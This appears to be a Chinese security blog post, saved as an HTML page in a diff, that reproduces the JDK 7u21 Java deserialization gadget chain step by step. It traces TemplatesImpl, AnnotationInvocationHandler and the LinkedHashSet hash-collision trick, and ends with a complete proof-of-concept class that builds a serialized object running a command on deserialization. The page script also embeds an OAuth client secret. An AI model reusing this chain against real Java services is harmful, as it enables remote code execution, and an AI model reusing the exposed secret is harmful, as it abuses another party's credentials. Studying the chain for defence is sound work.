@@ -1,0 +1,697 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>jdk7u21反序列化复现 | oxcccccc</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="JDK7u21反序列化链复现exp: public class jdk7u21 {     public static void main(String[] args) throws Exception {              TemplatesImpl calc &#x3D; (TemplatesImpl) Gadgets.createTemplatesImpl(&quot;calc&quot;);">
+<meta property="og:type" content="article">
+<meta property="og:title" content="jdk7u21反序列化复现">
+<meta property="og:url" content="https://www.ccreater.top/1970/01/01/jdk7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="oxcccccc">
+<meta property="og:description" content="JDK7u21反序列化链复现exp: public class jdk7u21 {     public static void main(String[] args) throws Exception {              TemplatesImpl calc &#x3D; (TemplatesImpl) Gadgets.createTemplatesImpl(&quot;calc&quot;);">
+<meta property="og:locale" content="zh">
+<meta property="og:image" content="https://raw.githubusercontent.com/Explorersss/photo/master/20201004163506.png">
+<meta property="article:published_time" content="1970-01-01T00:00:00.000Z">
+<meta property="article:modified_time" content="2020-10-04T13:59:22.747Z">
+<meta property="article:author" content="ccreater">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Explorersss/photo/master/20201004163506.png">
+  
+    <link rel="alternate" href="/atom.xml" title="oxcccccc" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">oxcccccc</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://www.ccreater.top"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-jdk7u21反序列化复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/1970/01/01/jdk7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/" class="article-date">
+  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web/">web</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      jdk7u21反序列化复现
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="JDK7u21反序列化链复现"><a href="#JDK7u21反序列化链复现" class="headerlink" title="JDK7u21反序列化链复现"></a>JDK7u21反序列化链复现</h1><p>exp:</p>
+<pre><code class="java">public class jdk7u21 {
+    public static void main(String[] args) throws Exception {
+
+            TemplatesImpl calc = (TemplatesImpl) Gadgets.createTemplatesImpl(&quot;calc&quot;);//生成恶意的calc
+            calc.getOutputProperties();//调用getOutputProperties就可以执行calc
+    }
+}</code></pre>
+<p>一步步调试发现在<code>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code>弹出calc<br><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201004163506.png" alt="image466"><br>第380行是触发命令执行的点</p>
+<h2 id="newInstance"><a href="#newInstance" class="headerlink" title="newInstance"></a>newInstance</h2><pre><code class="java">public class instance {
+    static{
+        try {
+            Runtime.getRuntime().exec(&quot;calc.exe&quot;);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+    public static void main(String args[]){
+        try {
+            instance.class.newInstance();
+        } catch (InstantiationException e) {
+            e.printStackTrace();
+        } catch (IllegalAccessException e) {
+            e.printStackTrace();
+        }
+
+    }
+}
+
+</code></pre>
+<p>将恶意代码放在static或构造方法中便可以在初始化时执行恶意代码</p>
+<h2 id="getTransletInstance"><a href="#getTransletInstance" class="headerlink" title="getTransletInstance"></a>getTransletInstance</h2><p>逐句执行观察到命令执行的限制条件与getOutputProperties和newTransformer没有太大关系<br>在getTransletInstance中发现一系列的限制</p>
+<pre><code class="java">private Translet getTransletInstance()
+        throws TransformerConfigurationException {
+        try {
+            if (_name == null) return null;//TemplatesImpl._name!=null
+
+            if (_class == null) defineTransletClasses();//TemplatesImpl._class==null
+
+            // The translet needs to keep a reference to all its auxiliary
+            // class to prevent the GC from collecting them
+            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();//_transletIndex在defineTransletClasses中定义
+            translet.postInitialization();
+            translet.setTemplates(this);
+            translet.setServicesMechnism(_useServicesMechanism);
+            if (_auxClasses != null) {
+                translet.setAuxiliaryClasses(_auxClasses);
+            }
+
+            return translet;
+        }
+        catch (InstantiationException e) {
+            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
+            throw new TransformerConfigurationException(err.toString());
+        }
+        catch (IllegalAccessException e) {
+            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
+            throw new TransformerConfigurationException(err.toString());
+        }
+    }</code></pre>
+<p>TemplatesImpl._name!=null和TemplatesImpl._class==null是执行到newInstance处的必要条件<br>而_transletIndex也是在defineTransletClasses中定义<br>跟进defineTransletClasses查找进一步的限制条件</p>
+<h2 id="defineTransletClasses"><a href="#defineTransletClasses" class="headerlink" title="defineTransletClasses"></a>defineTransletClasses</h2><pre><code class="java">private void defineTransletClasses()
+        throws TransformerConfigurationException {
+
+        if (_bytecodes == null) {//_bytecodes!=null
+            ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
+            throw new TransformerConfigurationException(err.toString());
+        }
+
+        TransletClassLoader loader = (TransletClassLoader)
+            AccessController.doPrivileged(new PrivilegedAction() {
+                public Object run() {
+                    return new TransletClassLoader(ObjectFactory.findClassLoader());
+                }
+            });
+
+        try {
+            final int classCount = _bytecodes.length;
+            _class = new Class[classCount];
+
+            if (classCount &gt; 1) {
+                _auxClasses = new Hashtable();
+            }
+
+            for (int i = 0; i &lt; classCount; i++) {
+                _class[i] = loader.defineClass(_bytecodes[i]);
+                final Class superClass = _class[i].getSuperclass();
+
+                // Check if this is the main class
+                if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
+                    _transletIndex = i;
+                }//_class.superClass==com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet
+                else {
+                    _auxClasses.put(_class[i].getName(), _class[i]);
+                }
+            }
+
+            ...
+        }
+        ...
+    }</code></pre>
+<p>阅读代码发现<code>_class[i] = loader.defineClass(_bytecodes[i]);</code>加载了我们的恶意类，但是它必须是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>的子类<br>_bytecodes!=null<br>综上我们可以得知要执行到恶意代码的触发点需要满足以下条件</p>
+<pre><code>1. TemplatesImpl._name!=null
+2. TemplatesImpl._class==null
+3. _bytecodes!=null
+4. 恶意类是`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`的子类
+5. TemplatesImpl类中的_tfactory变量需要有一个getExternalExtensionsMap方法（其他版本的限制条件）</code></pre><p>关于第五点的相关代码是(与7u21略有不同)：</p>
+<pre><code class="java">TransletClassLoader loader = (TransletClassLoader)
+            AccessController.doPrivileged(new PrivilegedAction() {
+                public Object run() {
+                    return new 
+        //限制条件4：TemplatesImpl类中的_tfactory变量需要有一个getExternalExtensionsMap方法
+        //           即需要是一个TransformerFactoryImpl类
+   TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
+                }
+            });</code></pre>
+<h2 id="尝试自己写一个POC"><a href="#尝试自己写一个POC" class="headerlink" title="尝试自己写一个POC"></a>尝试自己写一个POC</h2><h3 id="Gadgets-createTemplatesImpl"><a href="#Gadgets-createTemplatesImpl" class="headerlink" title="Gadgets.createTemplatesImpl"></a>Gadgets.createTemplatesImpl</h3><p>跟进</p>
+<pre><code class="java">public static TemplatesImpl createTemplatesImpl(final String command) throws Exception {
+        final TemplatesImpl templates = new TemplatesImpl();
+
+        // use template gadget class
+        ClassPool pool = ClassPool.getDefault();
+        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
+        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
+        // run command in static initializer
+        clazz.makeClassInitializer()
+                .insertAfter(&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;
+                        + command.replaceAll(&quot;\&quot;&quot;, &quot;\\\&quot;&quot;)
+                        + &quot;\&quot;);&quot;);
+        // unique name to allow repeated execution (watch out for PermGen exhaustion)
+        clazz.setName(&quot;ysoserial.Pwner&quot; + System.nanoTime());//Sets the class name
+
+        final byte[] classBytes = clazz.toBytecode();
+
+        // inject class bytes into instance
+        Reflections.setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] {
+                classBytes,
+                ClassFiles.classAsBytes(Foo.class)});
+//                  classBytes});
+        // required to make TemplatesImpl happy
+        Reflections.setFieldValue(templates, &quot;_name&quot;, &quot;Pwnr&quot;);
+//        Reflections.setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+        Reflections.setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+        return templates;
+    }</code></pre>
+<p>其中clazz是我们的恶意类装在templates的_bytecodes中，templates满足了其他的限制条件<br>这里用了javassist来构造我们的恶意类</p>
+<h3 id="javassist简介"><a href="#javassist简介" class="headerlink" title="javassist简介"></a>javassist简介</h3><p><a href="https://www.cnblogs.com/rickiyang/p/11336268.html" target="_blank" rel="noopener">https://www.cnblogs.com/rickiyang/p/11336268.html</a></p>
+<pre><code class="java">
+    ClassPool pool = ClassPool.getDefault();
+    pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
+    final CtClass clazz = pool.get(StubTransletPayload.class.getName());
+    clazz.makeClassInitializer()//Makes an empty class initializer (static constructor).
+                    .insertAfter(&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;
+                            + command.replaceAll(&quot;\&quot;&quot;, &quot;\\\&quot;&quot;)
+                            + &quot;\&quot;);&quot;);//在方法后面添加代码
+    clazz.setName(&quot;ysoserial.Pwner&quot; + System.nanoTime());</code></pre>
+<h3 id="自己实现"><a href="#自己实现" class="headerlink" title="自己实现"></a>自己实现</h3><pre><code class="java">public class myjdk7u21 {
+    public static class evil extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet implements Serializable{
+
+        @Override
+        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+        }
+
+        @Override
+        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+        }
+
+    }
+    public static void main(String args[]) throws NotFoundException, CannotCompileException, NoSuchFieldException, IllegalAccessException, IOException {
+        ClassPool pool = ClassPool.getDefault();
+        pool.insertClassPath(new ClassClassPath(evil.class));
+        CtClass evilobj = pool.get(evil.class.getName());
+        evilobj.makeClassInitializer().insertAfter(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);
+        evilobj.setName(&quot;ccreater233&quot;+System.nanoTime());
+
+        final TemplatesImpl tpl = new TemplatesImpl();
+        setField(TemplatesImpl.class,tpl,&quot;_name&quot;,&quot;ccreater&quot;);
+        setField(TemplatesImpl.class,tpl,&quot;_class&quot;,null);
+        setField(TemplatesImpl.class,tpl,&quot;_bytecodes&quot;,new byte[][]{evilobj.toBytecode()});
+        tpl.getOutputProperties();
+
+    }
+    public static void setField(Class clazz,Object obj,String key,Object value) throws NoSuchFieldException, IllegalAccessException {
+        Field field = clazz.getDeclaredField(key);
+        field.setAccessible(true);
+        field.set(obj,value);
+    }
+}
+</code></pre>
+<p>遇到的坑：evil记得声明为public，不然默认是private,就无法newInstance了</p>
+<h2 id="动态代理AnnotationInvocationHandler"><a href="#动态代理AnnotationInvocationHandler" class="headerlink" title="动态代理AnnotationInvocationHandler"></a>动态代理AnnotationInvocationHandler</h2><p>利用动态代理来接近反序列化后直接RCE的目的</p>
+<pre><code class="java">        final Constructor&lt;?&gt; ctor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructors()[0];
+        ctor.setAccessible(true);
+        InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Templates.class,new HashMap());
+
+        TempInt proxy = (TempInt)Proxy.newProxyInstance(TempInt.class.getClassLoader(),new Class[]{TempInt.class},invocationHandler);
+        proxy.equals(tpl);</code></pre>
+<p>我们看下AnnotationInvocationHandler的构造方法</p>
+<pre><code class="java">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) {
+        this.type = var1;
+        this.memberValues = var2;
+    }</code></pre>
+<p>type和memberValues皆可控</p>
+<p>debug跟进<br>proxy.equals 调用了动态代理AnnotationInvocationHandler的invoke方法</p>
+<pre><code class="java">    public Object invoke(Object var1, Method var2, Object[] var3) {
+            String var4 = var2.getName();
+            Class[] var5 = var2.getParameterTypes();
+            if (var4.equals(&quot;equals&quot;) &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) {
+                return this.equalsImpl(var3[0]);
+            }
+            ...
+    }</code></pre>
+<p>方法名为equals且只有一个参数，这进入<code>this.equalsImpl(var3[0]);</code></p>
+<p>equalsImpl</p>
+<pre><code class="java">private Boolean equalsImpl(Object var1) {
+        if (var1 == this) {
+            return true;
+        } else if (!this.type.isInstance(var1)) {
+            return false;
+        } else {
+            Method[] var2 = this.getMemberMethods();
+            int var3 = var2.length;
+
+            for(int var4 = 0; var4 &lt; var3; ++var4) {
+                Method var5 = var2[var4];
+                String var6 = var5.getName();
+                Object var7 = this.memberValues.get(var6);
+                Object var8 = null;
+                AnnotationInvocationHandler var9 = this.asOneOfUs(var1);
+                if (var9 != null) {
+                    var8 = var9.memberValues.get(var6);
+                } else {
+                    try {
+                        var8 = var5.invoke(var1);
+                    } catch (InvocationTargetException var11) {
+                        return false;
+                    } catch (IllegalAccessException var12) {
+                        throw new AssertionError(var12);
+                    }
+                }...
+            }
+        }
+    }</code></pre>
+<p>在这个方法中调用了<code>var8 = var5.invoke(var1);</code>,相当于var1.var5(),其中var1是a.equals(b)中的b<br>var5是this.type的第一个方法(this.getMemberMethods()[0])<br>跟进getMemberMethods</p>
+<pre><code class="java">private Method[] getMemberMethods() {
+        if (this.memberMethods == null) {
+            this.memberMethods = (Method[])AccessController.doPrivileged(new PrivilegedAction&lt;Method[]&gt;() {
+                public Method[] run() {
+                    Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods();
+                    AccessibleObject.setAccessible(var1, true);
+                    return var1;
+                }
+            });
+        }
+
+        return this.memberMethods;
+    }</code></pre>
+<p>也就是说我们可以通过控制this.type从而调用xx.equals(evilObj),来达到evilObj.AnyMethod()的效果<br>这也恰好符合了我们想调用evilObj.getOutputProperties()情况<br>最后选择了Templates,它的第一个方法是newTransformer,漏洞点在newTransformer中触发</p>
+<h2 id="LinkedHashSet反序列化调用equals"><a href="#LinkedHashSet反序列化调用equals" class="headerlink" title="LinkedHashSet反序列化调用equals"></a>LinkedHashSet反序列化调用equals</h2><p>问我为啥知道这里可以，答：别人发现的<br>LinkedHashSet没有实现readObject方法而是调用了HashSet的readObject方法，既然如此，为啥不直接调用HashSet嘞<br>等下就知道了<br>HashSet::readObject</p>
+<pre><code class="java">private void readObject(java.io.ObjectInputStream s)
+        throws java.io.IOException, ClassNotFoundException {
+        // Read in any hidden serialization magic
+        s.defaultReadObject();
+
+        // Read in HashMap capacity and load factor and create backing HashMap
+        int capacity = s.readInt();
+        float loadFactor = s.readFloat();
+        map = (((HashSet)this) instanceof LinkedHashSet ?
+               new LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :
+               new HashMap&lt;E,Object&gt;(capacity, loadFactor));
+
+        // Read in size
+        int size = s.readInt();
+
+        // Read in all elements in the proper order.
+        for (int i=0; i&lt;size; i++) {
+            E e = (E) s.readObject();
+            map.put(e, PRESENT);
+        }
+    }</code></pre>
+<p>跟进HashMap::put方法</p>
+<pre><code class="java">public V put(K key, V value) {
+        if (key == null)
+            return putForNullKey(value);
+        int hash = hash(key);
+        int i = indexFor(hash, table.length);
+        for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) {
+            Object k;
+            if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) {
+                V oldValue = e.value;
+                e.value = value;
+                e.recordAccess(this);
+                return oldValue;
+            }
+        }
+
+        modCount++;
+        addEntry(hash, key, value, i);
+        return null;
+    }</code></pre>
+<p>我们看到key.equals(k)完美的符合了我们的预期<br>这里得是顺序调用才能常出现proxy.equals(evilObj),所以用了LinkedHashSet<br>但是在这之前我们要满足两个条件</p>
+<ol>
+<li>e.hash == hash即hash(proxy) == hash(evilObj)</li>
+<li>e.key!=key即proxy!=evilObj<br>第二个条件很容易满足，第一个条件就GG了<br>跟进int hash = hash(key);中的hash方法看一下发现</li>
+</ol>
+<pre><code class="java">final int hash(Object k) {
+        int h = 0;
+        if (useAltHashing) {
+            if (k instanceof String) {
+                return sun.misc.Hashing.stringHash32((String) k);
+            }
+            h = hashSeed;
+        }
+
+        h ^= k.hashCode();
+
+        // This function ensures that hashCodes that differ only by
+        // constant multiples at each bit position have a bounded
+        // number of collisions (approximately 8 at default load factor).
+        h ^= (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12);
+        return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4);
+    }</code></pre>
+<p>调用了key的hashCode方法，即进入了AnnotationInvocationHandler的invoke方法<br>见证奇迹的时刻：<br>在invoke中有这样的一句话：</p>
+<pre><code>if (var4.equals(&quot;hashCode&quot;)) {
+    return this.hashCodeImpl();</code></pre><p>跟进hashCodeImpl</p>
+<pre><code class="java">    private int hashCodeImpl() {
+        int var1 = 0;
+
+        Entry var3;
+        for(Iterator var2 = this.memberValues.entrySet().iterator(); var2.hasNext(); var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) {
+            var3 = (Entry)var2.next();
+        }
+
+        return var1;
+    }</code></pre>
+<p>我们关注<code>var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())</code><br>这相当于<code>127*key.hashcode()^Arrays.hashCode((Object[])((Object[])value))</code><br>因为0^x=x,且<em>优先级大于^,所以令key.hashcode()=0使得e.hash == hash最终变成<br>127</em>key.hashcode()^Arrays.hashCode((Object[])((Object[])value))=0^value.hashcode()==value.hashcode()<br>所以构造</p>
+<pre><code class="java">package org.example;
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import javassist.*;
+
+import javax.xml.transform.Templates;
+import java.io.*;
+import java.lang.reflect.*;
+import java.util.HashMap;
+import java.util.HashSet;
+import java.util.LinkedHashSet;
+
+import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
+
+
+public class myjdk7u21 {
+
+    public static class evil extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet implements Serializable{
+
+        @Override
+        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+        }
+
+        @Override
+        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+        }
+
+    }
+
+    public static void main(String args[]) throws Exception {
+        ClassPool pool = ClassPool.getDefault();
+        pool.insertClassPath(new ClassClassPath(evil.class));
+        CtClass evilobj = pool.get(evil.class.getName());
+        evilobj.makeClassInitializer().insertAfter(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);
+        evilobj.setName(&quot;ccreater233&quot;+System.nanoTime());
+
+        final TemplatesImpl tpl = new TemplatesImpl();
+        setField(TemplatesImpl.class,tpl,&quot;_name&quot;,&quot;ccreater&quot;);
+        setField(TemplatesImpl.class,tpl,&quot;_class&quot;,null);
+        setField(TemplatesImpl.class,tpl,&quot;_bytecodes&quot;,new byte[][]{evilobj.toBytecode()});
+        //evil instance
+
+        //tpl.getOutputProperties();
+        final Constructor&lt;?&gt; ctor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructors()[0];
+        ctor.setAccessible(true);
+        HashMap map = new HashMap();
+        map.put(&quot;f5a5a608&quot;,&quot;23333&quot;);
+        InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Templates.class,map);
+
+        TempInt proxy = (TempInt)Proxy.newProxyInstance(TempInt.class.getClassLoader(),new Class[]{TempInt.class},invocationHandler);
+
+        HashSet a = new LinkedHashSet();
+        a.add(tpl);
+        a.add(proxy);
+        map.put(&quot;f5a5a608&quot;,tpl);
+
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        //序列化
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+        objectOutputStream.writeObject(a);//序列化对象
+        objectOutputStream.flush();
+        objectOutputStream.close();
+        //反序列化
+        byte[] bytes = byteArrayOutputStream.toByteArray(); //读取序列化后的对象byte数组
+        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);//存放byte数组的输入流
+        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
+        Object o = objectInputStream.readObject();
+
+    }
+    public static void setField(Class clazz,Object obj,String key,Object value) throws NoSuchFieldException, IllegalAccessException {
+        Field field = clazz.getDeclaredField(key);
+        field.setAccessible(true);
+        field.set(obj,value);
+    }
+}
+</code></pre>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/jdk7u21反序列化复现/">https://www.ccreater.top/1970/01/01/jdk7u21反序列化复现/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://www.ccreater.top/1970/01/01/jdk7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/" data-id="ckmn57575005ws1nicp0z07hm" data-title="jdk7u21反序列化复现" class="article-share-link">Share</a>
+      
+	  
+			  
+				  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+  <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+  <script src="/js/md5.min.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '2928409e787d74264ece',
+        clientSecret: '8e2a058971b6fac2da6dd1fb6e8233aaf095a7b5 ',
+        id: md5(window.location.pathname),
+        repo: 'ccreater222.github.io',
+        owner: 'ccreater222',
+        admin: 'ccreater222',
+        distractionFreeMode: 'true'
+    })
+    gitalk.render('gitalk-container')
+</script>
+				
+	  
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/1970/01/01/i%E6%98%A5%E7%A7%8B2020/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          i春秋2020
+        
+      </div>
+    </a>
+  
+  
+    <a href="/1970/01/01/jwt%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">jwt攻击方式</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/htb/" rel="tag">htb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" 